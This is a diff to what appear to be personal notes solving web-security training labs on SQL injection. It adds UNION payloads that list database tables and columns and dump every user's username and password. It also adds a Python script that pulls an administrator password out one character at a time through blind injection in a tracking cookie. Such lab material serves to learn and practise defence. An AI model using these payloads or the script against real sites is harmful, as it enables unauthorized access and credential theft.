@@ -66,13 +66,78 @@ To solve the lab, display the database version string.
 
 ## Summary
 
- This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
+This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
+
 The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.
+
 To solve the lab, log in as the administrator user. 
 
 **Fix**
-1. Use Burp Suite to intercept and modify the request that sets the product category filter.
+1.  Use Burp Suite to intercept and modify the request that sets the product category filter.
 2. Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter:
-'+UNION+SELECT+'abc','def'#
-3. Use the following payload to display the database version:
-'+UNION+SELECT+@@version,+NULL#
+'+UNION+SELECT+'abc','def'--
+3. Use the following payload to retrieve the list of tables in the database:
+'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
+Find the name of the table containing user credentials.
+4. Use the following payload (replacing the table name) to retrieve the details of the columns in the table:
+'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--
+Find the names of the columns containing usernames and passwords.
+5. Use the following payload (replacing the table and column names) to retrieve the usernames and passwords for all users:
+'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--
+Find the password for the administrator user, and use it to log in. 
+
+# [SQL injection] — [Blind SQL injection with conditional responses]
+
+## Summary
+
+This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
+
+The results of the SQL query are not returned, and no error messages are displayed. But the application includes a Welcome back message in the page if the query returns any rows.
+
+The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.
+
+To solve the lab, log in as the administrator user.  
+
+**Fix**
+USE THE FOLLOWING SCRIPT:
+#!/usr/bin/env python3
+
+import requests
+import string
+
+url = "https://0a0b000f04e781038005eeba00030047.web-security-academy.net/"
+
+tracking_id = "kA9ovCWWPxN5wtQ3"
+session = "FxTpefzL9PMxcWhwYw7bapATayW9CZ62"
+
+chars = string.ascii_lowercase + string.digits
+password = ""
+
+for position in range(1, 21):
+    found = False
+
+    for char in chars:
+        payload = (
+            f"{tracking_id}' AND "
+            f"SUBSTRING((SELECT password FROM users "
+            f"WHERE username='administrator'),{position},1)='{char}'-- "
+        )
+
+        cookies = {
+            "TrackingId": payload,
+            "session": session
+        }
+
+        response = requests.get(url, cookies=cookies)
+
+        if "Welcome back" in response.text:
+            password += char
+            print(f"[+] Position {position}: {char}    Password: {password}")
+            found = True
+            break
+
+    if not found:
+        print(f"[-] No character found at position {position}")
+        break
+
+print(f"\nPassword: {password}")
